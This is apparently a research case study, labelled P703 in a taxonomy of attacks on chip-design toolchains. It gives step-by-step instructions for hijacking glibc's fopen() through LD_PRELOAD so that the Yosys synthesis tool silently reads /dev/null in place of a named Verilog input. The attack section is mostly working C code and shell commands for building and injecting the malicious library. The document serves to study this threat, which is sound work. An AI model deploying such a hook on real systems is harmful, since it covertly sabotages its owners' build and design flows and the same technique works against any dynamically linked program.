# P703: Configuration-Based Flow Disruption Affecting Availability

This case study corresponds to taxonomy path **P703**:

- **$A_{\mathrm{sw}}$ — Vulnerability/Configuration Exploitation:** the attacker exploits software configuration or runtime behavior within the VLSI tool environment.
- **$M_{\mathrm{sw}}$ — Vulnerability/Configuration-Based Control:** the exploitation provides control over how the tool accesses or processes its input artifacts.
- **$A_{\mathrm{vlsi}}$ — Access Abuse or System Disruption:** the attacker disrupts the design flow by removing or replacing required RTL inputs.
- **Stage:** Logic Synthesis.
- **Outcome:** Availability.

This folder contains files for reproducing the P703 case-study attack.

## P703 Attack: Library Hijacking of fopen() to Remove or Replace Input Artifacts (Design Availability Disruption)

### Goal
Demonstrate how hijacking a runtime file-handling function used by an EDA tool can silently remove or replace critical input artifacts, causing the synthesis process to operate on missing or incorrect inputs and disrupting the design flow.

---

### Target
- **Tool:** Yosys  
- **Library:** glibc  
- **Intercepted Function:** `fopen()`  
- **Stage Affected:** Stage 2 — Logic Synthesis 
- **Security Impact:** Availability violation (critical RTL input artifacts removed or replaced)

---

### Step 1 — Create Malicious Hook
Create the wrapper source file:

```bash
nano trojan_fopen.c
```

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

FILE *fopen(const char *filename, const char *mode) {
    static FILE *(*original_fopen)(const char *, const char *) = NULL;
    if (!original_fopen)
        original_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(filename, "original_verilog.v")) {
        printf("[AA2T2] Replacing input artifact with empty file\n");
        return original_fopen("/dev/null", mode);
    }

    return original_fopen(filename, mode);
}
```

---

### Step 2 — Compile Malicious Library

```bash
gcc -shared -fPIC -o libfopen_trojan.so trojan_fopen.c -ldl
```

---

### Step 3 — Prepare Input RTL File

```bash
echo "module trojan_top(input a, output y); assign y=a; endmodule" > original_verilog.v
```

---

### Step 4 — Inject Malicious Library Using LD_PRELOAD

```bash
LD_PRELOAD=./libfopen_trojan.so yosys
```

Inside Yosys:

```bash
read_verilog original_verilog.v
```

---

### Step 5 — Observe Attack Effect
The malicious `fopen()` intercepts the file-opening operation and replaces the legitimate RTL file with an empty artifact (`/dev/null`), causing the synthesis stage to operate on missing or corrupted inputs.

---

### Impact

This attack demonstrates a P703 availability compromise by silently removing or replacing critical input artifacts during Logic Synthesis, disrupting the VLSI design flow without modifying the EDA tool binary.
